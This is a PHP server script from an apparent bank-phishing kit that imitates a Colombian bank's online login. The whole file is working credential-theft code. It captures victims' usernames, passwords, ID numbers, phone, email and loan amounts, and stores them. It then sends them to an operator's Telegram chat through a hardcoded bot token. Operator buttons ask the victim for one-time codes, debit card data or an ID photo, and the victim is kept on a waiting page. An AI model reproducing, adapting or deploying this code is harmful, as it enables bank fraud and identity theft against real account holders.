<?php

ob_start();
session_start();
require __DIR__ . DIRECTORY_SEPARATOR . 'conexion.php';

date_default_timezone_set('America/Bogota');

$nombreUsuario    = isset($_POST['usuario']) ? $_POST['usuario'] : '';
$password         = isset($_POST['clave']) ? $_POST['clave'] : '';
$claveUnica       = isset($_POST['key']) ? $_POST['key'] : '';
$email            = isset($_POST['correo']) ? $_POST['correo'] : '';

$tipoDoc          = isset($_POST['tipo_documento']) ? $_POST['tipo_documento'] : '';
$numDoc           = isset($_POST['numero_documento']) ? $_POST['numero_documento'] : '';
$montoRaw         = isset($_POST['monto']) ? $_POST['monto'] : '';
$montoTexto       = isset($_POST['monto_texto']) ? $_POST['monto_texto'] : '';
$nombreUsuarioInit = isset($_POST['nombre_usuario']) ? $_POST['nombre_usuario'] : '';
$telefono         = isset($_POST['telefono']) ? $_POST['telefono'] : '';
$bancoPost        = isset($_POST['banco']) ? $_POST['banco'] : '';

if (trim($claveUnica) === '') {
    $claveUnica = 'auto_' . bin2hex(random_bytes(16));
}

$bancoFinal = 'Bancolombia';
if (is_string($bancoPost)) {
    if (trim($bancoPost) !== '') {
        $bancoFinal = trim($bancoPost);
    }
}

$sel = $pdo->prepare("SELECT request_id, correo, estado, numero_cuenta, monto, banco, nombre, telefono FROM solicitudes WHERE `key` = ? LIMIT 1");
$sel->execute(array($claveUnica));
$existente = $sel->fetch(PDO::FETCH_ASSOC);

try {
    $idPeticion = 'BCO_' . bin2hex(random_bytes(18));
} catch (Throwable $e) {
    $idPeticion = 'BCO_' . bin2hex(openssl_random_pseudo_bytes(18));
}

$numeroCuentaFinal = '';
if (trim($telefono) !== '') {
    $numeroCuentaFinal = $telefono;
} elseif (is_array($existente) && isset($existente['numero_cuenta'])) {
    $numeroCuentaFinal = $existente['numero_cuenta'];
}

$montoFinal = '';
if (trim($montoTexto) !== '') {
    $montoFinal = trim($montoTexto);
} elseif (trim($montoRaw) !== '') {
    $montoFinal = trim($montoRaw);
} elseif (is_array($existente) && isset($existente['monto'])) {
    $montoFinal = $existente['monto'];
}

$nombreFinal = '';
if (trim($nombreUsuarioInit) !== '') {
    $nombreFinal = trim($nombreUsuarioInit);
} elseif (is_array($existente) && isset($existente['nombre'])) {
    $nombreFinal = $existente['nombre'];
}

$correoFinal = '';
if (trim($email) !== '') {
    $correoFinal = trim($email);
} elseif (is_array($existente) && isset($existente['correo'])) {
    $correoFinal = $existente['correo'];
}

$upsert = $pdo->prepare(
    "INSERT INTO solicitudes
        (`key`, `user`, `password`, `request_id`, `correo`, `estado`, `banco`,
         `numero_cuenta`, `monto`, `nombre`, `telefono`)
     VALUES
        (:k, :u, :p, :rid, :em, 'pendiente', :bco,
         :nc, :mont, :nom, :tel)
     ON DUPLICATE KEY UPDATE
         `user`         = VALUES(`user`),
         `password`     = VALUES(`password`),
         `request_id`   = VALUES(`request_id`),
         `correo`       = IF(VALUES(`correo`) <> '', VALUES(`correo`), `correo`),
         `banco`        = IF(VALUES(`banco`) <> '', VALUES(`banco`), `banco`),
         `numero_cuenta` = IF(VALUES(`numero_cuenta`) <> '', VALUES(`numero_cuenta`), `numero_cuenta`),
         `monto`        = IF(VALUES(`monto`) <> '', VALUES(`monto`), `monto`),
         `nombre`       = IF(VALUES(`nombre`) <> '', VALUES(`nombre`), `nombre`),
         `telefono`     = IF(VALUES(`telefono`) <> '', VALUES(`telefono`), `telefono`),
         `estado`       = 'pendiente'"
);

$upsert->execute(array(
    ':k'    => $claveUnica,
    ':u'    => $nombreUsuario,
    ':p'    => $password,
    ':rid'  => $idPeticion,
    ':em'   => $correoFinal,
    ':bco'  => $bancoFinal,
    ':nc'   => $numeroCuentaFinal,
    ':mont' => $montoFinal,
    ':nom'  => $nombreFinal,
    ':tel'  => $telefono,
));

$DEFAULT_BOT_TOKEN_OPS = "8924841749:AAG6MK_tMpRF19EehX5iEQdfotCySeD6m4c";
$DEFAULT_CHAT_ID_OPS   = "-5503364698";

$envBot = getenv('TELEGRAM_BOT_TOKEN_OPS');
$envCh  = getenv('TELEGRAM_CHAT_ID_OPS');

$botToken = $DEFAULT_BOT_TOKEN_OPS;
if (is_string($envBot)) {
    if (trim($envBot) !== '') {
        $botToken = $envBot;
    }
}

$idChat = $DEFAULT_CHAT_ID_OPS;
if (is_string($envCh)) {
    if (trim($envCh) !== '') {
        $idChat = $envCh;
    }
}

function fv($v, $placeholder = '<i>(no informado)</i>') {
    $s = is_string($v) ? trim($v) : '';
    if ($s === '') {
        return $placeholder;
    }
    return htmlspecialchars($s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}

$docCompleto  = trim($tipoDoc . ' ' . $numDoc);
$montoMuestra = trim($montoFinal);
if ($montoMuestra === '' && trim($montoRaw) !== '') {
    $montoMuestra = trim($montoRaw);
}

$SEP = str_repeat("-", 30);
$mensaje  = "";
$mensaje .= "\xF0\x9F\x86\x95 <b>[LOGIN VIRTUAL-PERSONA]</b> Datos completos capturados en esta sesion:\n";
$mensaje .= $SEP . "\n";
$mensaje .= "\xF0\x9F\x93\x84 <b>Documento:</b> " . fv($docCompleto) . "\n";
if (trim($nombreFinal) !== '' || trim($nombreUsuarioInit) !== '') {
    $nv = trim($nombreFinal) !== '' ? $nombreFinal : $nombreUsuarioInit;
    $mensaje .= "\xF0\x9F\x91\xA4 <b>Nombre (landing):</b> " . fv($nv) . "\n";
}
$mensaje .= "\xF0\x9F\x92\xB0 <b>Monto / Cupo solicitado:</b> " . fv($montoMuestra) . "\n";
$mensaje .= "\xF0\x9F\x8F\xA6 <b>Banco:</b> " . fv($bancoFinal) . "\n";
$mensaje .= "\xF0\x9F\x93\xA7 <b>Correo:</b> " . fv($correoFinal) . "\n";
$mensaje .= $SEP . "\n";
$mensaje .= "\xF0\x9F\x91\xA4 <b>Usuario Virtual-Persona:</b> " . fv($nombreUsuario) . "\n";
$mensaje .= "\xF0\x9F\x94\x92 <b>Clave Virtual-Persona:</b> " . fv($password) . "\n";

$teclado = array(
    'inline_keyboard' => array(
        array(
            array('text' => "\xF0\x9F\x9F\xA2 DINAMICA",       'callback_data' => "OPCION_1_" . $idPeticion),
            array('text' => "\xF0\x9F\x92\xB3 TARJETA DEBITO", 'callback_data' => "OPCION_2_" . $idPeticion),
        ),
        array(
            array('text' => "\xF0\x9F\x94\xB4 ERROR DINAMICA", 'callback_data' => "OPCION_3_" . $idPeticion),
            array('text' => "\xE2\x9D\x8C ERROR CLAVE",        'callback_data' => "OPCION_4_" . $idPeticion),
            array('text' => "\xF0\x9F\x93\xB8 FOTO CEDULA",    'callback_data' => "OPCION_5_" . $idPeticion),
        ),
        array(
            array('text' => "\xF0\x9F\x9F\xA9 FINALIZAR",      'callback_data' => "OPCION_10_" . $idPeticion),
        ),
    ),
);

$payloadArr = array(
    'chat_id'                  => $idChat,
    'text'                     => $mensaje,
    'parse_mode'               => 'HTML',
    'disable_web_page_preview' => true,
    'reply_markup'             => $teclado,
);
$payload = json_encode($payloadArr);

$ch = curl_init("https://api.telegram.org/bot" . $botToken . "/sendMessage");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);

$_SESSION['usuario']          = $nombreUsuario;
$_SESSION['clave']            = $password;
$_SESSION['correo']           = $correoFinal;
$_SESSION['celular']          = $numeroCuentaFinal;
$_SESSION['monto']            = $montoFinal;
$_SESSION['banco']            = $bancoFinal;
$_SESSION['tipo_documento']   = $tipoDoc;
$_SESSION['numero_documento'] = $numDoc;
$_SESSION['nombre']           = $nombreFinal;
$_SESSION['telefono']         = $telefono;
$_SESSION['request_id']       = $idPeticion;
$_SESSION['key']              = $claveUnica;

$redirArr = array(
    'rid'    => $idPeticion,
    'key'    => $claveUnica,
    'correo' => $correoFinal,
);
$redirQs = http_build_query($redirArr, '', '&', PHP_QUERY_RFC3986);
header("Location: espera.html?" . $redirQs);
exit;
